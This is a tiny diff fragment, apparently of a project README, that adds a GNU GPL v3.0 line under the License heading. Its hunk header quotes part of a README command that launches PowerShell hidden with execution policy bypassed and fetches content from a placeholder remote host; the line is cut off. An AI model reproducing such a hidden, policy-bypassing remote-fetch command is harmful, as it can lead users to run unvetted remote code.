@@ -98,6 +98,7 @@ powershell -W Hidden -Exec Bypass -c "$r = iwr https://your-script-host.com/ -H 
 4. Push and submit pull request
 
 ## License
+GNU General Public License v3.0
 
 
 
